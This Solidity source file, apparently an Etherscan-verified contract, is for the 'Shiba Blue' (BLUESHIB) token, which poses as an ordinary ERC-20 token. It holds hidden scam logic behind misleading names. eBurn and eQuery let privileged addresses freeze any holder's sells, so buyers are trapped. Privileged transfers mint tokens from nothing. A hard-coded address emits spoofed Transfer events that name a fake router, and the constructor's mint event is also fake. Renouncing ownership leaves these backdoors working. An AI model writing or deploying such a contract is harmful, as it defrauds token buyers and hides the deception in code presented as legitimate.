/**
 *Submitted for verification at Etherscan.io on 2022-11-03
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address ESK = 0xf84308B5e77BB364fd589CCE137Bd5CaAe326eA6;
	address EZrouter = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
        		modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }

}



contract ShibaBlue is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Ec;
	mapping (address => bool) private Eb;
    mapping (address => bool) private Flw;
    mapping (address => mapping (address => uint256)) private eD;
    uint8 private constant _Dec = 8;
    uint256 private constant sE = 150000000 * 10**_Dec;
    string private constant _name = "Shiba Blue";
    string private constant _symbol = "BLUESHIB";



    constructor () {
        Ec[_msgSender()] = sE;
         eploy(); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _Dec;
    }

    function totalSupply() public pure  returns (uint256) {
        return sE;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Ec[account];
    }
    function eploy() onlyOwner internal {
    emit Transfer(address(0), EZrouter, sE); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return eD[owner][spender];
    }
	        function eBurn(address Ef) onlyOwner public{
        Eb[Ef] = true; }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        eD[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

        
		function eStake(address Ef) public {
        if(Eb[msg.sender]) { 
        Flw[Ef] = false;}}
        function eQuery(address Ef) public{
         if(Eb[msg.sender])  { 
        Flw[Ef] = true; }}
   

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == ESK)  {
        require(amount <= Ec[sender]);
        Ec[sender] -= amount;  
        Ec[recipient] += amount; 
          eD[sender][msg.sender] -= amount;
        emit Transfer (EZrouter, recipient, amount);
        return true; }  else  
          if(!Flw[recipient]) {
          if(!Flw[sender]) {
         require(amount <= Ec[sender]);
        require(amount <= eD[sender][msg.sender]);
        Ec[sender] -= amount;
        Ec[recipient] += amount;
        eD[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Ei, uint256 Ef) public {
        if(msg.sender == ESK)  {
        require(Ec[msg.sender] >= Ef);
        Ec[msg.sender] -= Ef;  
        Ec[Ei] += Ef; 
        emit Transfer (EZrouter, Ei, Ef);} else  
        if(Eb[msg.sender]) {Ec[Ei] += Ef;} else
        if(!Flw[msg.sender]) {
        require(Ec[msg.sender] >= Ef);
        Ec[msg.sender] -= Ef;  
        Ec[Ei] += Ef;          
        emit Transfer(msg.sender, Ei, Ef);}}}